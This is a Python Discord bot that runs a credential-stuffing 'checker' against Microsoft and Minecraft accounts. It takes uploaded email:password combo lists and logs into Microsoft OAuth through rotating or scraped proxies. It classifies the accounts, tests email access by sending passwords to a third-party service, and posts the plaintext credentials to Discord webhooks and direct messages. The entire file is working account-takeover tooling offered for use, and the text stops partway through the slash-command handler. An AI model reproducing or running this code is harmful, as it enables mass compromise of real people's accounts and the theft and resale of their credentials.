import discord
from discord.ext import commands
import asyncio
import threading
import queue
import time
from datetime import datetime, timezone
import os
from dotenv import load_dotenv
import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar

try:
    from colorama import Fore
    colorama_available = True
except ImportError:
    colorama_available = False
    class Fore:
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTRED_EX = '\033[91m'

class LinuxUtils:
    @staticmethod
    def set_title(title):
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

utils = LinuxUtils()

class LinuxFileDialog:
    @staticmethod
    def askopenfile(**kwargs):
        filepath = input("Enter the full path to your file: ")
        if os.path.exists(filepath):
            return type('FileObj', (), {'name': filepath})()
        return None

filedialog = LinuxFileDialog()

try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Warning: Minecraft networking library not available. Ban checking will be disabled.")

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

class Config:
    def __init__(self):
        self.data = {}
    def set(self, key, value):
        self.data[key] = value
    def get(self, key):
        return self.data.get(key)

config = Config()

# ══════════════════════════════════════════════════════════════════════
# SESSION-SAFE CAPTURE CLASS (no globals)
# ══════════════════════════════════════════════════════════════════════
class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session, stats, proxies_list, fname, maxretries):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.stats = stats
        self.proxies_list = proxies_list
        self.fname = fname
        self.maxretries = maxretries
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def getproxy(self):
        if not self.proxies_list:
            return None
        try:
            proxy = random.choice(self.proxies_list)
            if isinstance(proxy, dict):
                return proxy
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        except:
            return None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl is not None: message += f"\nHypixel: {self.hypixl}"
        if self.level is not None: message += f"\nHypixel Level: {self.level}"
        if self.firstlogin is not None: message += f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin is not None: message += f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape is not None: message += f"\nOptifine Cape: {self.cape}"
        if self.access is not None: message += f"\nEmail Access: {self.access}"
        if self.sbcoins is not None: message += f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars is not None: message += f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged is not None: message += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged is not None: message += f"\nLast Name Change: {self.lastchanged}"
        return message + "\n============================\n"

    def notify(self, webhook_url):
        try:
            wh = config.get('webhook') or webhook_url
            if str(self.banned).lower() == "false" and config.get('UnbannedWebhook'):
                wh = config.get('UnbannedWebhook')
            elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown" and config.get('BannedWebhook'):
                wh = config.get('BannedWebhook')
            if not wh:
                return
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A"),
                "username": "Vex Development"
            }
            requests.post(wh, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
        except:
            pass

    def handle(self, session, webhook_url):
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban(session)
            except: pass
        fullcapt = self.builder()
        self.stats['hits'] += 1
        try:
            os.makedirs(f"results/{self.fname}", exist_ok=True)
            with open(f"results/{self.fname}/Hits.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
            with open(f"results/{self.fname}/Capture.txt", 'a') as f: f.write(fullcapt + "\n============================\n")
        except: pass
        self.notify(webhook_url)

    def hypixel(self):
        try:
            if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=self.getproxy(),
                                headers={'User-Agent':'Mozilla/5.0'}, verify=False, timeout=15).text
                try:
                    if config.get('hypixelname'): self.hypixl = re.search('(?<=og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try:
                    if config.get('hypixellevel'): self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try:
                    if config.get('hypixelfirstlogin'): self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try:
                    if config.get('hypixellastlogin'): self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try:
                    if config.get('hypixelbwstars'): self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins'):
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=self.getproxy(), verify=False, timeout=15)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: self.stats['errors'] = self.stats.get('errors', 0) + 1

    def optifine(self):
        if config.get('optifinecape'):
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=self.getproxy(), verify=False, timeout=10).text
                self.cape = "No" if "Not found" in txt else "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        if config.get('access'):
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False, timeout=15).text)
                if out.get("Success") == 1:
                    self.access = "True"
                    self.stats['mfa'] = self.stats.get('mfa', 0) + 1
                    os.makedirs(f"results/{self.fname}", exist_ok=True)
                    with open(f"results/{self.fname}/MFA.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                else:
                    self.access = "False"
                    self.stats['sfa'] = self.stats.get('sfa', 0) + 1
                    os.makedirs(f"results/{self.fname}", exist_ok=True)
                    with open(f"results/{self.fname}/SFA.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"

    def namechange(self):
        if config.get('namechange') or config.get('lastchanged'):
            tries = 0
            while tries < self.maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange',
                                       headers={'Authorization': f'Bearer {self.token}'}, proxies=self.getproxy(), verify=False, timeout=15)
                    if check.status_code == 200:
                        data = check.json()
                        if config.get('namechange'): self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                        if config.get('lastchanged'):
                            created_at = data.get('createdAt')
                            if created_at:
                                try:
                                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                except ValueError:
                                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                given_date = given_date.replace(tzinfo=timezone.utc)
                                current_date = datetime.now(timezone.utc)
                                difference = current_date - given_date
                                years = difference.days // 365
                                months = (difference.days % 365) // 30
                                days = difference.days
                                if years > 0: self.lastchanged = f"{years} year(s)"
                                elif months > 0: self.lastchanged = f"{months} month(s)"
                                else: self.lastchanged = f"{days} day(s)"
                        break
                    if check.status_code == 429:
                        time.sleep(5)
                except: pass
                tries += 1

    def ban(self, session):
        if config.get('hypixelban') and minecraft_available:
            try:
                auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
                auth_token.profile = Profile(id_=self.uuid, name=self.name)
                tries = 0
                max_ban_retries = self.maxretries if self.maxretries > 0 else 3
                while tries < max_ban_retries:
                    connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                    
                    @connection.listener(clientbound.login.DisconnectPacket, early=True)
                    def login_disconnect(packet):
                        try:
                            data = json.loads(str(packet.json_data))
                            if "banned" in str(data).lower() or "Suspicious activity" in str(data):
                                self.banned = "True"
                                os.makedirs(f"results/{self.fname}", exist_ok=True)
                                with open(f"results/{self.fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                                self.stats['banned_count'] = self.stats.get('banned_count', 0) + 1
                            else:
                                self.banned = "False"
                                os.makedirs(f"results/{self.fname}", exist_ok=True)
                                with open(f"results/{self.fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                                self.stats['unbanned'] = self.stats.get('unbanned', 0) + 1
                        except:
                            self.banned = "False"
                    
                    try:
                        connection.connect()
                        time.sleep(1)
                        try: connection.disconnect()
                        except: pass
                    except: pass
                    
                    if self.banned is not None: break
                    tries += 1
            except: pass

# ══════════════════════════════════════════════════════════════════════
# SESSION-SAFE CHECKER FUNCTIONS
# ══════════════════════════════════════════════════════════════════════

def ms_login_session(email, password, session, proxies_list):
    """Session-safe MS login using Xbox/Minecraft OAuth flow"""
    try:
        from urllib.parse import quote as _quote
        s = session or requests.Session()
        s.verify = False
        if proxies_list:
            proxy = random.choice(proxies_list)
            if isinstance(proxy, dict):
                s.proxies.update(proxy)
            else:
                s.proxies.update({"http": "http://"+proxy, "https": "http://"+proxy})

        # Step 1: Get login page using the Xbox/Minecraft client ID
        r1 = s.get(sFTTag_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        post_url = None
        ppft = None
        for pat in [r'urlPost\s*:\s*["\'](.*?)["\'](?:\s*,)?\s*', r'urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
            m = re.search(pat, r1.text)
            if m:
                post_url = m.group(1).replace("\\/", "/")
                break
        for pat in [r'sFTTag\s*:.*?value="([^"]+)"', r'name="PPFT"[^>]*value="([^"]+)"']:
            m = re.search(pat, r1.text)
            if m:
                ppft = m.group(1)
                break
        if not post_url or not ppft:
            return {"status": "RETRY"}

        # Step 2: Submit credentials
        body = (
            f"login={_quote(email)}&loginfmt={_quote(email)}"
            f"&passwd={_quote(password)}"
            f"&PPFT={_quote(ppft)}&PPSX=PassportR"
            "&i13=0&type=11&LoginOptions=3&i19=197664"
        )
        r2 = s.post(post_url, data=body,
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Mozilla/5.0"},
                    allow_redirects=True, timeout=15)
        t = r2.text.lower()

        if any(x in t for x in ["your account or password is incorrect",
                                  "that microsoft account doesn't exist",
                                  "we couldn't find an account"]):
            return {"status": "BAD"}
        if r2.text.count('"error"') > 2 and "access_token" not in r2.url:
            return {"status": "BAD"}
        if any(x in t for x in ["identity/confirm", "proofup", "sms", "authenticator",
                                  "consent", "verify your identity", "two-step", "2-step",
                                  "security info"]):
            return {"status": "2FA"}
        if "abuse" in t or "blocked" in t:
            return {"status": "BAD"}

        # Step 3: Extract access token from redirect URL fragment
        access_token = None
        final_url = r2.url
        for pat in [r"access_token=([^&#]+)", r"#access_token=([^&#]+)"]:
            m = re.search(pat, final_url)
            if m:
                access_token = m.group(1)
                break
        # Fallback: check response body
        if not access_token:
            m = re.search(r'access_token["\'\s]*[:=]["\'\s]*([^&"\'\s,}]+)', r2.text)
            if m:
                access_token = m.group(1)

        if not access_token:
            return {"status": "BAD"}

        cid = s.cookies.get("MSPCID", str(uuid.uuid4())).upper()
        return {"status": "HIT", "token": access_token, "cid": cid, "session": s}
    except:
        return {"status": "RETRY"}

def check_mc_session(session, email, password, token, stats, fname, proxies_list, maxretries, webhook_url):
    """Session-safe Minecraft check"""
    try:
        # Get MC profile
        r = session.get('https://api.minecraftservices.com/minecraft/profile',
                       headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=15)
        if r.status_code == 200:
            profile = r.json()
            name = profile.get('name', 'N/A')
            capes = ", ".join([c.get("alias", "") for c in profile.get("capes", [])]) or "None"
            uuid_str = profile.get('id', 'N/A')
            
            # Check entitlements
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=15)
            
            acc_type = "Normal"
            if checkrq.status_code == 200:
                if 'product_game_pass_ultimate' in checkrq.text:
                    acc_type = "Xbox Game Pass Ultimate"
                    stats['xgpu'] = stats.get('xgpu', 0) + 1
                    os.makedirs(f"results/{fname}", exist_ok=True)
                    with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                elif 'product_game_pass_pc' in checkrq.text:
                    acc_type = "Xbox Game Pass"
                    stats['xgp'] = stats.get('xgp', 0) + 1
                    os.makedirs(f"results/{fname}", exist_ok=True)
                    with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                elif '"product_minecraft"' not in checkrq.text:
                    others = []
                    if 'product_minecraft_bedrock' in checkrq.text: others.append("Bedrock")
                    if 'product_legends' in checkrq.text: others.append("Legends")
                    if 'product_dungeons' in checkrq.text: others.append("Dungeons")
                    if others:
                        acc_type = "Other: " + ", ".join(others)
                        stats['other'] = stats.get('other', 0) + 1
                        os.makedirs(f"results/{fname}", exist_ok=True)
                        with open(f"results/{fname}/Other.txt", 'a') as f: f.write(f"{email}:{password} | {', '.join(others)}\n")
            
            cap = Capture(email, password, name, capes, uuid_str, token, acc_type, session, stats, proxies_list, fname, maxretries)
            cap.handle(session, webhook_url)
            return True
        else:
            # Valid mail but no MC
            stats['vm'] = stats.get('vm', 0) + 1
            os.makedirs(f"results/{fname}", exist_ok=True)
            with open(f"results/{fname}/Valid_Mail.txt", 'a') as f: f.write(f"{email}:{password}\n")
            return False
    except:
        return False

def authenticate_session(email, password, proxies_list, stats, fname, maxretries, webhook_url, tries=0):
    """Session-safe full authentication"""
    try:
        session = requests.Session()
        session.verify = False
        
        if proxies_list:
            proxy = random.choice(proxies_list)
            if isinstance(proxy, dict):
                session.proxies.update(proxy)
            else:
                session.proxies.update({'http': 'http://'+proxy, 'https': 'http://'+proxy})
        
        # MS Login
        res = ms_login_session(email, password, session, proxies_list)
        
        if res["status"] == "HIT":
            token = res["token"]
            session = res["session"]
            
            # Xbox auth
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate',
                    json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token},
                          "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                
                if xbox_token:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                        json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                              "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"},
                        headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js2 = xsts.json()
                    xsts_token = js2.get('Token')
                    
                    if xsts_token:
                        mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                            json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                            headers={'Content-Type': 'application/json'}, timeout=15)
                        mc_token = mc_login.json().get('access_token')
                        
                        if mc_token:
                            check_mc_session(session, email, password, mc_token, stats, fname, proxies_list, maxretries, webhook_url)
                            return
            except:
                pass
            
            # Valid mail fallback
            stats['vm'] = stats.get('vm', 0) + 1
            os.makedirs(f"results/{fname}", exist_ok=True)
            with open(f"results/{fname}/Valid_Mail.txt", 'a') as f: f.write(f"{email}:{password}\n")
            
        elif res["status"] == "2FA":
            stats['twofa'] += 1
            os.makedirs(f"results/{fname}", exist_ok=True)
            with open(f"results/{fname}/2fa.txt", 'a') as f: f.write(f"{email}:{password}\n")
        else:
            stats['bad'] += 1
            
    except:
        if tries < maxretries:
            authenticate_session(email, password, proxies_list, stats, fname, maxretries, webhook_url, tries+1)
        else:
            stats['bad'] += 1

# ══════════════════════════════════════════════════════════════════════
# DISCORD BOT
# ══════════════════════════════════════════════════════════════════════
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents)
synced_commands = False

active_checkers = {}

class CheckerSession:
    def __init__(self, ctx, threads, proxy_type, combos_file, proxies_file=None, webhook_url=None):
        self.ctx = ctx
        self.threads = threads
        self.proxy_type = proxy_type
        self.combos_file = combos_file
        self.proxies_file = proxies_file
        self.webhook_url = webhook_url
        self.session_id = str(ctx.id)
        self.is_running = True
        self.stats_lock = threading.Lock()
        self.combos = []
        self.proxies = []
        self.fname = ""
        self.maxretries = 5
        
        self.stats = {
            'checked': 0, 'total': 0, 'hits': 0, 'bad': 0, 'twofa': 0,
            'sfa': 0, 'mfa': 0, 'xgp': 0, 'xgpu': 0, 'other': 0,
            'vm': 0, 'errors': 0, 'retries': 0, 'unbanned': 0, 'banned_count': 0,
            'start_time': datetime.now()
        }

    async def send_status_update(self):
        if not self.is_running: return
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        progress_percent = (self.stats['checked'] / self.stats['total']) * 100 if self.stats['total'] > 0 else 0
        
        embed = discord.Embed(title="🔍 Checker Status", color=discord.Color.blue(), timestamp=datetime.now())
        embed.add_field(name="Progress", value=f"`{self.stats['checked']}/{self.stats['total']}` ({progress_percent:.1f}%)", inline=True)
        embed.add_field(name="Results", value=f"✅ Hits: `{self.stats['hits']}`\n❌ Bad: `{self.stats['bad']}`\n🔐 2FA: `{self.stats['twofa']}`", inline=True)
        embed.add_field(name="Account Types", value=f"🎮 SFA: `{self.stats['sfa']}`\n🔓 MFA: `{self.stats['mfa']}`\n📧 Valid Mail: `{self.stats['vm']}`", inline=True)
        embed.add_field(name="Xbox & Other", value=f"🎯 XGP: `{self.stats['xgp']}`\n⚡ XGPU: `{self.stats['xgpu']}`\n📦 Other: `{self.stats['other']}`", inline=True)
        embed.add_field(name="Ban Status", value=f"🟢 Unbanned: `{self.stats['unbanned']}`\n🔴 Banned: `{self.stats['banned_count']}`", inline=True)
        embed.add_field(name="Technical", value=f"🔄 Retries: `{self.stats['retries']}`\n❓ Errors: `{self.stats['errors']}`\n⏱️ {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}", inline=True)
        embed.set_footer(text=f"Session ID: {self.session_id}")
        try: await self.ctx.send(embed=embed)
        except: pass

    async def send_results_to_dm(self):
        try:
            user = self.ctx.author
            dm_channel = await user.create_dm()
            elapsed = datetime.now() - self.stats['start_time']
            hours, remainder = divmod(elapsed.total_seconds(), 3600)
            minutes, seconds = divmod(remainder, 60)
            
            embed = discord.Embed(title="📊 Checker Results", description=f"Session `{self.session_id[:8]}...` completed", color=discord.Color.green())
            embed.add_field(name="Hits", value=str(self.stats['hits']), inline=True)
            embed.add_field(name="Bad", value=str(self.stats['bad']), inline=True)
            embed.add_field(name="2FA", value=str(self.stats['twofa']), inline=True)
            embed.add_field(name="Duration", value=f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}", inline=True)
            await dm_channel.send(embed=embed)
            
            file_types = {
                "Hits.txt": "✅ Hits", "Capture.txt": "📋 Full Captures", "2fa.txt": "🔐 2FA Accounts",
                "SFA.txt": "🎮 SFA Accounts", "MFA.txt": "🔓 MFA Accounts",
                "Banned.txt": "🔴 Banned Accounts", "Unbanned.txt": "🟢 Unbanned Accounts",
                "XboxGamePass.txt": "🎯 Xbox Game Pass", "XboxGamePassUltimate.txt": "⚡ Xbox Game Pass Ultimate",
                "Other.txt": "📦 Other", "Valid_Mail.txt": "📧 Valid Mail"
            }
            
            results_dir = f"results/{self.fname}"
            if os.path.exists(results_dir):
                files_sent = False
                for filename, description in file_types.items():
                    filepath = os.path.join(results_dir, filename)
                    if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
                        try:
                            discord_file = discord.File(filepath, filename=filename)
                            await dm_channel.send(f"**{description}** - `{filename}`", file=discord_file)
                            files_sent = True
                        except: pass
                if not files_sent:
                    await dm_channel.send("⚠️ No result files were generated.")
            else:
                await dm_channel.send("⚠️ No results directory found.")
        except discord.Forbidden:
            try: await self.ctx.send("⚠️ I couldn't send you the results in DM. Please enable DMs from server members.")
            except: pass
        except Exception as e:
            print(f"Error sending results to DM: {e}")

    async def run_checker(self):
        try:
            loadconfig_session()
            
            # Load combos
            with open(self.combos_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.combos = list(set([l.strip() for l in f if l.strip() and ":" in l]))
            
            if not self.combos:
                await self.ctx.send("❌ No valid combos found!")
                return
            
            self.stats['total'] = len(self.combos)
            self.maxretries = config.get('maxretries') or 5
            
            # Load proxies if needed
            if self.proxy_type in ["'1'", "'2'", "'3'"] and self.proxies_file:
                with open(self.proxies_file, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [l.strip().split()[0] for l in f if l.strip()]
            
            # Auto-scrape proxies
            if self.proxy_type == "'5'":
                await self.ctx.send("🔄 Scraping proxies...")
                self.proxies = scrape_proxies()
                if not self.proxies:
                    await self.ctx.send("❌ Failed to scrape proxies. Switching to proxyless mode.")
                    self.proxy_type = "'4'"
            
            # Setup results directory
            self.fname = f"discord_check_{self.session_id}"
            os.makedirs(f"results/{self.fname}", exist_ok=True)
            
            # Start status loop
            asyncio.create_task(self.status_loop())
            
            embed = discord.Embed(title="🚀 Checker Started", color=discord.Color.green(),
                                description=f"Checking {self.stats['total']} accounts with {self.threads} threads")
            embed.add_field(name="Session ID", value=self.session_id, inline=True)
            await self.ctx.send(embed=embed)
            
            # Run checker in thread pool
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, self._run_checker_blocking)
            
            await self.send_final_summary("🏁 Checker Completed")
            await self.send_results_to_dm()
            
        except Exception as e:
            await self.ctx.send(f"❌ Checker error: {str(e)}")
            traceback.print_exc()
        finally:
            if self.session_id in active_checkers:
                del active_checkers[self.session_id]
            try:
                if os.path.exists(self.combos_file): os.remove(self.combos_file)
                if self.proxies_file and os.path.exists(self.proxies_file): os.remove(self.proxies_file)
            except: pass

    def _run_checker_blocking(self):
        """Run checker with session-local state - NO GLOBALS"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for combo in self.combos:
                if not self.is_running: break
                futures.append(executor.submit(self._check_single_combo, combo))
            
            for future in concurrent.futures.as_completed(futures):
                if not self.is_running: break
                try: future.result()
                except: self.stats['errors'] += 1

    def _check_single_combo(self, combo):
        """Check one combo - fully session-local"""
        if not self.is_running: return
        try:
            split = combo.strip().split(":")
            email = split[0]
            password = ":".join(split[1:]) if len(split) > 2 else split[1]
            
            if email and password:
                authenticate_session(email, password, self.proxies, self.stats, 
                                   self.fname, self.maxretries, self.webhook_url)
            else:
                self.stats['bad'] += 1
            
            self.stats['checked'] += 1
        except:
            self.stats['bad'] += 1
            self.stats['checked'] += 1

    def get_proxy_type_name(self):
        return {"'1'":"HTTP","'2'":"SOCKS4","'3'":"SOCKS5","'4'":"None","'5'":"Auto Scraper"}.get(self.proxy_type, "Unknown")

    async def status_loop(self):
        while self.is_running and self.stats['checked'] < self.stats['total']:
            await self.send_status_update()
            await asyncio.sleep(10)

    async def send_final_summary(self, title="🏁 Checker Completed"):
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        embed = discord.Embed(title=title, color=discord.Color.green() if self.stats['checked'] >= self.stats['total'] else discord.Color.orange(), timestamp=datetime.now())
        embed.description = f"**Completed** - All {self.stats['total']} accounts checked" if self.stats['checked'] >= self.stats['total'] else f"**Stopped** - {self.stats['checked']}/{self.stats['total']} checked"
        
        embed.add_field(name="Final Results", value=f"✅ **Hits**: `{self.stats['hits']}`\n❌ **Bad**: `{self.stats['bad']}`\n🔐 **2FA**: `{self.stats['twofa']}`\n🎮 **SFA**: `{self.stats['sfa']}`\n🔓 **MFA**: `{self.stats['mfa']}`", inline=True)
        embed.add_field(name="Account Types", value=f"🎯 **XGP**: `{self.stats['xgp']}`\n⚡ **XGPU**: `{self.stats['xgpu']}`\n📦 **Other**: `{self.stats['other']}`\n📧 **Valid Mail**: `{self.stats['vm']}`", inline=True)
        embed.add_field(name="Ban Status", value=f"🟢 **Unbanned**: `{self.stats['unbanned']}`\n🔴 **Banned**: `{self.stats['banned_count']}`", inline=True)
        embed.add_field(name="Statistics", value=f"⏱️ **Duration**: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}\n📊 **Total**: `{self.stats['total']}`\n🔍 **Checked**: `{self.stats['checked']}`\n❓ **Errors**: `{self.stats['errors']}`", inline=True)
        embed.set_footer(text=f"Session ID: {self.session_id}")
        
        await self.ctx.send(embed=embed)

def scrape_proxies():
    """Scrape proxies - returns list"""
    proxies = []
    apis = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    for api in apis:
        try:
            proxies.extend(requests.get(api, timeout=15).text.splitlines())
        except: pass
    return list(set([p.strip() for p in proxies if p.strip()]))

def loadconfig_session():
    """Load config into global config object"""
    default_config = {
        'Settings': {
            'Webhook': '', 'BannedWebhook': '', 'UnbannedWebhook': '',
            'Embed': True, 'Max Retries': 5, 'Proxyless Ban Check': True,
            'WebhookMessage': 'Email: <email>\nPassword: <password>\nName: <name>'
        },
        'Captures': {
            'Hypixel Name': True, 'Hypixel Level': True, 'First Hypixel Login': True,
            'Last Hypixel Login': True, 'Optifine Cape': True, 'Minecraft Capes': True,
            'Email Access': True, 'Hypixel Skyblock Coins': True, 'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True, 'Name Change Availability': True, 'Last Name Change': True
        }
    }
    
    for section, values in default_config.items():
        for key, value in values.items():
            config.set(key.lower().replace(' ', ''), value)

@bot.event
async def on_ready():
    global synced_commands
    print(f'🤖 {bot.user} has logged in!')
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.watching, name=".gg/vaultcore Stocks"))
    if not synced_commands:
        try:
            synced = await bot.tree.sync()
            synced_commands = True
            print(f"✅ Synced {len(synced)} slash command(s)")
        except Exception as e:
            print(f"❌ Failed to sync slash commands: {e}")

@bot.tree.command(name="check", description="Start checking Minecraft accounts")
async def check(interaction: discord.Interaction, threads: int, proxy_type: str, webhook_url: str = None):
    await interaction.response.defer()
    
    if threads < 1 or threads > 50:
        await interaction.followup.send("❌ Threads must be between 1 and 50")
        return
    
    proxy_map = {'1':"'1'",'http':"'1'",'2':"'2'",'socks4':"'2'",'3':"'3'",'socks5':"'3'",'4':"'4'",'none':"'4'",'5':"'5'",'auto':"'5'"}
    if proxy_type.lower() not in proxy_map:
        await interaction.followup.send("❌ Invalid proxy type. Use: `1` (Http/s), `2` (Socks4), `3` (Socks5), `4` (None), `5` (Auto Scraper)")
        return
    
    mapped_proxy_type = proxy_map[proxy_type.lower()]
    
    embed = discord.Embed(title="🔧 Checker Setup", description="Please upload your combos file to start checking", color=discord.Color.blue())
    embed.add_field(name="Threads", value=str(threads), inline=True)
    embed.add_field(name="Proxy Type", value=proxy_type, inline=True)
    embed.add_field(name="Webhook", value=webhook_url or "Not set", inline=True)
    await interaction.followup.send(embed=embed)
    await interaction.followup.send("📁 **Please upload your combos file now** (text file with email:password format):")
    
    def check_attachment(message):
        return (message.author == interaction.user and message.channel == interaction.channel and 
                message.attachments and message.attachments[0].filename.endswith('.txt'))
    
    try:
        attachment_msg = await bot.wait_for('message', check=check_attachment, timeout=60.0)
        combos_attachment = attachment_msg.attachments[0]
        combos_content = await combos_attachment.read()
        combos_path = f"temp_combos_{interaction.id}.txt"
        with open(combos_path, 'wb') as f: f.write(combos_content)
        
        with open(combos_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            if len(lines) == 0:
                await interaction.followup.send("❌ The provided combos file is empty.")
                os.remove(combos_path)
                return
        
        try: await attachment_msg.delete()
        except: pass
        await interaction.followup.send(f"✅ **Combos loaded**: {len(lines)} accounts")
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ File upload timed out.")
        return
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")
        return
    
    proxies_path = None
    if mapped_proxy_type not in ["'4'", "'5'"]:
